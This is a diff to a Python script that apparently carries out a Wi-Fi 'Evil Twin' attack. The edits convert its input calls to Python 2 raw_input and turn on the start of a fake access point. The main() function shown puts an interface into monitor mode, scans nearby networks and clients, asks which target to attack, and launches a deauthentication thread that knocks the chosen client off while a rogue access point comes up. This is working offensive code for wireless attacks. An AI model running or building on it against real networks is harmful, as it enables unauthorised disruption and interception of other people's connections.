@@ -67,8 +67,8 @@ def create_conf_file(iface , ssid):
 
 def main():
     global iface ,ap_mac
-    iface = input("please enter the first interface name: ") #for sniffing users
-    iface2= input("Please enter the second interface name: ") #for creating fake AP 
+    iface = raw_input("please enter the first interface name: ") #for sniffing users
+    iface2= raw_input("Please enter the second interface name: ") #for creating fake AP 
     #step 1: Change the first interface to monitor mode:
     iface = mm.Change_to_MonitorMode_airmon(iface)
     print("********Evil Twin Attack*********")
@@ -76,7 +76,7 @@ def main():
     Wifi_scaning() 
     # Choose access point to attack
     if len(ap_list) > 0 : 
-        mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
+        mac_adder = int(raw_input("\nEnter the index of the ssid you want to attack: ")) -1
         ap_mac = ap_list[mac_adder]
         ssid_name = ssid_list[mac_adder]
         # for creating the fake AP we need 2 '.conf' files
@@ -84,13 +84,13 @@ def main():
         Users_scaning()
     #Choose user to attack
     if len(users_list) > 0 :
-        user_adder = int(input("\nEnter the index of the client you want to attack: ")) -1
+        user_adder = int(raw_input("\nEnter the index of the client you want to attack: ")) -1
         user_mac = users_list[user_adder]
         disconnectThread= threading.Thread(target= DisConnectAttack, args= (user_mac ,ap_mac, iface ,))
         disconnectThread.start()
         time.sleep(3)
         print("process keep going...")
-        #f_ap.start(net_stick_iface)
+        f_ap.start(iface2)
         while True:
             try:
                 time.sleep(2) 
@@ -98,7 +98,7 @@ def main():
                 break
         mm.Change_back_airmon(iface)
         cc.Delete_conf_files()
-        #os.system("rm *.conf")
+        
         
 
 if __name__ == "__main__":
